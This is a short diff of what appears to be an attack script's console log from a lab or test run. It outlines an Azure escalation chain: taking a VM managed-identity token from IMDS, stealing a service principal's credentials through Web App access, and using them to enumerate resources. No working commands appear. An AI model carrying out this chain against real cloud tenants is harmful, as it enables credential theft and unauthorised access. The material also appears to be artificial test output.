@@ -1,6 +1,6 @@
 [*] target VM:                <VM_PUBLIC_IP>
 [*] foothold:                 VM System-Assigned MI with Website Contributor on one Web App
-[*] target Web App:           pathtriage-z2-app-<rand>
+[*] target Web App:           pathtriage-z2-app-xpvbyh
 [*] acting from the VM itself (no external attacker host required)
 
 [*] Step 1: query IMDS for Managed Identity token (ARM-scoped)
@@ -19,7 +19,7 @@
 
 [*] Step 4: OAuth2 client_credentials flow to AAD as the stolen SP
 [+] SP ARM token acquired
-    token length:             1883 chars
+    token length:             1876 chars
     scope:                    https://management.azure.com/.default
 
 [*] Step 5a: enumerate resources in RG as SP (Contributor proof, read)
